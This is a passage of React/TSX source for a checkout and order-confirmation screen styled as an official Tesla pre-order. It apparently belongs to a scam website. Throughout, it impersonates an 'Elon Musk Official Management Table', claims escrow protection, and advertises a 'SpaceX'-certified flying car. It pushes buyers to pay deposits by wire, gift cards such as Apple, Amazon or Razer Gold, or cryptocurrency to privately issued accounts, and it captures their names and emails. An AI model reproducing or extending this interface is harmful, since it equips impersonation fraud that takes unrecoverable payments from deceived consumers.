                          {pendingRequest.id} · Pending Elon Musk Management
                        </span>
                      </div>
                      <p className="text-[11px] text-slate-300 leading-relaxed">
                        {paymentMethod === 'wire'
                          ? 'Your request for private Wire / ACH settlement credentials has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your banking details will appear here and in your In-App Inbox.'
                          : paymentMethod === 'gift_card'
                          ? 'Your request for official Gift Card settlement and redemption instructions has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your settlement details will appear here and in your In-App Inbox.'
                          : 'Your request for a verified Bitcoin, DOGE, or USDC settlement address has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your wallet address will appear here and in your In-App Inbox.'}
                      </p>
                      {onOpenInbox && (
                        <button
                          type="button"
                          onClick={onOpenInbox}
                          className="px-3.5 py-2 rounded-lg bg-[#040a18] border border-blue-500/45 hover:border-blue-400 text-blue-200 hover:text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer transition-colors"
                        >
                          <Mail className="w-3.5 h-3.5 text-blue-400" />
                          <span>Check In-App Inbox for Account</span>
                        </button>
                      )}
                    </div>
                  );
                }

                return (
                  <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs text-slate-200 space-y-3">
                    <div className="flex items-center justify-between gap-2">
                      <div className="font-semibold text-white flex items-center gap-2">
                        <Lock className="w-4 h-4 text-red-400" />
                        <span>
                          {paymentMethod === 'wire'
                            ? 'Wire Transfer / ACH Account — Elon Musk Management Issued'
                            : paymentMethod === 'gift_card'
                            ? 'Gift Card Settlement — Elon Musk Management Issued'
                            : 'Bitcoin / Doge / USDC Wallet — Elon Musk Management Issued'}
                        </span>
                      </div>
                      <span className="text-[10px] font-mono text-red-300 uppercase">
                        Private Escrow
                      </span>
                    </div>
                    <p className="text-[11px] text-slate-300 leading-relaxed">
                      {paymentMethod === 'wire'
                        ? 'To safeguard client allocations, official Wire and ACH banking credentials are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private settlement instructions prior to initiating your transfer.'
                        : paymentMethod === 'gift_card'
                        ? 'To safeguard client allocations, official Gift Card settlement brands and redemption accounts are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private gift card instructions prior to redeeming.'
                        : 'To safeguard client allocations, verified BTC, DOGE, and USDC settlement addresses are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain a dedicated wallet address prior to initiating your transfer.'}
                    </p>
                    <div className="flex flex-col sm:flex-row gap-2">
                      <input
                        type="text"
                        value={accountRequestNote}
                        onChange={(e) => setAccountRequestNote(e.target.value)}
                        placeholder={
                          paymentMethod === 'wire'
                            ? 'Optional note (e.g. Domestic Wire or ACH bank name)...'
                            : paymentMethod === 'gift_card'
                            ? 'Preferred card brand or card note (e.g. Apple, Amazon, Razer Gold)...'
                            : 'Preferred asset / network (e.g. BTC, DOGE, USDC)...'
                        }
                        className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                      />
                      <button
                        type="button"
                        onClick={() => {
                          onRequestPaymentAccount?.({
                            paymentMethod,
                            vehicleName: vehicle.name,
                            amountDue: amountPaidToday,
                            visitorName: customerName.trim() || 'Prospective Buyer',
                            visitorEmail: customerEmail.trim() || 'Pending Contact Email',
                            note: accountRequestNote.trim() || undefined,
                          });
                          setAccountRequestNote('');
                        }}
                        className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0 shadow-md"
                      >
                        <Send className="w-3.5 h-3.5" />
                        <span>
                          {paymentMethod === 'wire'
                            ? 'Request Wire Account from Elon Musk Management'
                            : paymentMethod === 'gift_card'
                            ? 'Request Gift Card Account from Elon Musk Management'
                            : 'Request Crypto Wallet from Elon Musk Management'}
                        </span>
                      </button>
                    </div>
                  </div>
                );
              })()}
            </div>

            <div className="p-4 rounded-xl bg-blue-950/50 border border-blue-500/35 text-xs text-slate-200 space-y-2">
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white">Tesla Order Guarantee:</span> Your deposit amounts are secured in escrow. Prior to vehicle delivery, you can transfer reservation priority or adjust options through your order management dashboard.
                </div>
              </div>
              <div className="pt-2 border-t border-blue-500/25 flex flex-col sm:flex-row sm:items-center justify-between text-[11px] text-slate-300 gap-1">
                <span>Payment &amp; Build Verification:</span>
                <span className="text-blue-300 font-mono font-medium">
                  Sent to Elon Musk Official Management Table for Account Provisioning
                </span>
              </div>
            </div>

            <div className="flex items-center justify-between pt-4 border-t border-blue-900/60">
              <button
                type="button"
                onClick={() => setStep('configure')}
                className="px-4 py-2 text-xs font-semibold text-slate-300 hover:text-white cursor-pointer"
              >
                Back to Configuration
              </button>

              <button
                type="submit"
                className="px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white font-semibold text-xs hover:brightness-110 active:scale-95 transition-all shadow-lg shadow-blue-500/20 cursor-pointer"
              >
                Confirm Pre-Order & Pay ${amountPaidToday.toLocaleString()}
              </button>
            </div>
          </form>
        )}

        {/* STEP 3: ORDER CONFIRMED RECEIPT & VIN RESERVATION */}
        {step === 'confirmed' && confirmedOrder && (
          <div className="flex-1 overflow-y-auto p-6 space-y-6">
            <div className="relative p-6 rounded-2xl bg-gradient-to-br from-[#091630] via-[#061024] to-[#1a0b18] border-2 border-blue-400/60 shadow-2xl overflow-hidden">
              <div className="absolute top-0 right-0 w-48 h-48 bg-blue-500/15 rounded-full blur-3xl pointer-events-none" />

              <div className="flex items-start justify-between pb-4 border-b border-blue-900/60">
                <div>
                  <div className="text-[10px] uppercase tracking-widest text-blue-300 font-bold">
                    OFFICIAL TESLA RESERVATION & BUILD ORDER
                  </div>
                  <h4 className="font-display text-2xl font-black text-white tracking-wider">
                    {confirmedOrder.vehicleName}
                  </h4>
                  {confirmedOrder.isFlyingCar && (
                    <div className="text-xs text-red-300 font-mono font-semibold">
                      SpaceX Cold Gas Thruster Flight Certified
                    </div>
                  )}
                </div>
                <div className="flex flex-col items-end gap-1">
                  <div className="px-3 py-1.5 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 text-white text-xs font-black tracking-wider uppercase flex items-center gap-1.5 shadow-md">
                    <ShieldCheck className="w-4 h-4" />
                    <span>SENT TO OFFICIAL MANAGEMENT TABLE</span>
                  </div>
                  <span className="text-[10px] font-mono text-red-300">
                    Awaiting Official Management Table Verification
                  </span>
                </div>
              </div>

              {/* Management Table Approval Notice Banner */}
              <div className="p-3.5 rounded-xl bg-blue-950/60 border border-blue-500/40 text-xs text-blue-100 flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                <div className="space-y-1">
                  <div className="font-bold text-white">Payment Status: Sent to Elon Musk Official Management Table</div>
                  <p className="text-[11px] leading-relaxed text-blue-100">
                    Your {confirmedOrder.paymentMethod === 'gift_card' ? 'gift card' : confirmedOrder.paymentMethod} payment reference <span className="font-mono font-bold text-red-300">{confirmedOrder.paymentReference}</span> has been sent to the Elon Musk Official Management Table for account provisioning and verification. Once verified, your factory build slot will be locked. Real-time updates and replies will arrive directly in your in-app inbox.
                  </p>
                </div>
              </div>

              <div className="py-5 grid grid-cols-2 sm:grid-cols-4 gap-4 text-xs">
                <div>
                  <div className="text-slate-400 text-[10px] uppercase">Reservation VIN</div>
                  <div className="text-blue-300 font-mono tabular-nums text-xs font-bold">
                    {confirmedOrder.reservationVin}
                  </div>
                </div>
                <div>
                  <div className="text-slate-400 text-[10px] uppercase">Amount Paid Today</div>
                  <div className="text-white font-mono tabular-nums text-xs font-bold">
                    ${confirmedOrder.amountPaidToday.toLocaleString()}
                  </div>
                </div>
                <div>
                  <div className="text-slate-400 text-[10px] uppercase">Real Vehicle Price</div>
                  <div className="text-white font-mono tabular-nums text-xs font-bold">
                    ${confirmedOrder.totalPrice.toLocaleString()}
                  </div>
                </div>
                <div>
                  <div className="text-slate-400 text-[10px] uppercase">Estimated Delivery</div>
                  <div className="text-slate-200 text-xs font-medium">
                    {confirmedOrder.estimatedDelivery}
                  </div>
                </div>
              </div>

              <div className="pt-4 border-t border-blue-900/60 flex items-center justify-between">
                <div>
                  <div className="text-xs text-slate-200 font-semibold">{confirmedOrder.customerName}</div>
                  <div className="text-[11px] text-slate-400">{confirmedOrder.customerEmail}</div>
                </div>
                <div className="w-12 h-12 bg-white rounded p-1 flex items-center justify-center">
                  <div className="w-full h-full bg-[#040a18] flex items-center justify-center text-white">
                    <QrCode className="w-8 h-8 text-white" />
                  </div>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-4 pt-2">
              <div className="text-xs text-slate-300">
                Payment request <span className="font-mono text-blue-300">{confirmedOrder.orderId}</span> has been sent to the Elon Musk Official Management Table for account provisioning and verification. Updates will arrive in your In-App Inbox.
              </div>

              <div className="flex items-center gap-3">
                <button
                  type="button"
                  onClick={() => setCertificateDownloaded(true)}
                  className="px-4 py-2 rounded-lg border border-blue-800/80 bg-[#08142b] text-slate-200 text-xs font-medium hover:border-blue-400/70 flex items-center gap-1.5 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>{certificateDownloaded ? 'Build Sheet Ready ✓' : 'Download Build Certificate'}</span>
                </button>

                <button
                  type="button"
                  onClick={onClose}
                  className="px-5 py-2.5 rounded-lg bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white font-semibold text-xs hover:brightness-110 cursor-pointer"
                >
                  Done & View My Fleet
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Bottom Bar during Configure */}
        {step === 'configure' && (
          <div className="p-4 border-t border-blue-900/60 bg-[#050d20] flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="flex items-baseline gap-3">
              <div>
                <span className="text-xs text-slate-300">Deposit Due Today: </span>
                <span className="text-xl font-display font-bold text-blue-300 font-mono tabular-nums">
                  ${amountPaidToday.toLocaleString()}
                </span>
              </div>
              <span className="text-blue-700">·</span>
              <div className="text-xs text-slate-300">
                Real Sold Price: <strong className="text-white font-mono tabular-nums">${realPriceSold.toLocaleString()}</strong>
              </div>
            </div>

            <div className="flex items-center gap-3 w-full sm:w-auto">
              <button
                type="button"
                onClick={onClose}
                className="px-4 py-2.5 text-xs font-semibold text-slate-300 hover:text-white cursor-pointer"
              >
                Cancel
              </button>
              <button
                type="button"
                onClick={() => setStep('checkout')}
                className="flex-1 sm:flex-none px-6 py-2.5 rounded-lg bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white font-semibold text-xs hover:brightness-110 active:scale-95 transition-all shadow-md shadow-blue-500/20 flex items-center justify-center gap-2 cursor-pointer whitespace-nowrap"
              >
                <span>Proceed to Reservation (${amountPaidToday.toLocaleString()})</span>
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  );
};
